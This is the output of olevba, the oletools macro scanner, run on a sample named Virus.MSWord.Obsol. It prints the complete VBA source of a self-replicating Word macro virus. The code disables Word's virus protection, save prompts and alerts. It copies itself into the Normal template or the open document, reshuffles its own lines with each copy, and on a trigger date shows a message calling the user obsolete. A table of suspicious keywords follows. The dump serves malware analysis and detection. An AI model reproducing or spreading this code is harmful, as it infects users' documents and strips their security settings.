olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Obsol
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Obsol - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Obsolete()
On Error Resume Next: Dim NCode(30) As String: GoTo Obsolete23
Obsolete03: OurSize = OurSelf.CountOfLines - cThree: GoTo Obsolete04
Obsolete04: i = i + cOne: GoTo Obsolete05
Obsolete05: c1 = cZero: c2 = cZero: c3 = Int(Rnd * (OurSize - i) + cOne): GoTo Obsolete06
Obsolete06: If NCode(c2 + cOne) = "" Then GoTo Obsolete07 Else GoTo Obsolete08
Obsolete07: c1 = c1 + cOne: GoTo Obsolete08
Obsolete08: c2 = c2 + cOne: GoTo Obsolete09
Obsolete09: If c1 < c3 Then GoTo Obsolete06 Else GoTo Obsolete10
Obsolete10: NCode(c2) = OurSelf.Lines((OurSize + cThree) - i, cOne): GoTo Obsolete11
Obsolete11: If i = OurSize Then GoTo Obsolete12 Else GoTo Obsolete04
Obsolete12: For y = cOne To OurSize: OurCode = OurCode & NCode(y) & vbCr: Next: GoTo Obsolete17
Obsolete13: If MacroContainer = ActiveDocument Then Set OurHost = NormalTemplate Else Set OurHost = ActiveDocument: GoTo Obsolete14
Obsolete14: Set OurVictim = OurHost.VBProject.VBComponents(cOne).CodeModule: GoTo Obsolete15
Obsolete15: Set OurSelf = ThisDocument.VBProject.VBComponents(cOne).CodeModule: GoTo Obsolete16
Obsolete16: If Len(OurSelf.Lines(cOne, OurSelf.CountOfLines)) <> Len(OurVictim.Lines(cOne, OurVictim.CountOfLines)) Then GoTo Obsolete03 Else GoTo Obsolete24
Obsolete17: OurVictim.DeleteLines cOne, OurVictim.CountOfLines: GoTo Obsolete18
Obsolete18: OurVictim.InsertLines cOne, OurSelf.Lines(cOne, cTwo) & vbCr & OurCode: GoTo Obsolete19
Obsolete19: OurVictim.DeleteLines OurVictim.CountOfLines, cOne: GoTo Obsolete20
Obsolete20: OurVictim.InsertLines OurVictim.CountOfLines + cOne, OurSelf.Lines(OurSelf.CountOfLines, cOne): GoTo Obsolete21
Obsolete21: If OurHost = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName: GoTo Obsolete24
Obsolete22: With Application: .Options.VirusProtection = cZero: .Options.SaveNormalPrompt = cZero: .DisplayStatusBar = cZero: .EnableCancelKey = cZero: .DisplayAlerts = cZero: End With: GoTo Obsolete13
Obsolete23: cZero = Asc(Chr(65)) - Asc(Chr(65)): cOne = Asc(Chr(66)) - Asc(Chr(65)): cTwo = Asc(Chr(67)) - Asc(Chr(65)): cThree = Asc(Chr(68)) - Asc(Chr(65)): cTrigger = Asc(Chr(96)) - Asc(Chr(65)): GoTo Obsolete22
Obsolete24: If Day(Now()) = cTrigger Then GoTo Obsolete25 Else GoTo Obsolete26
Obsolete25: MsgBox Application.UserName & " is obsolete.", cZero, "Class.Obsolete": GoTo Obsolete26
Obsolete26: Exit Sub
End Sub 'Written by an old friend...eikcaj
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

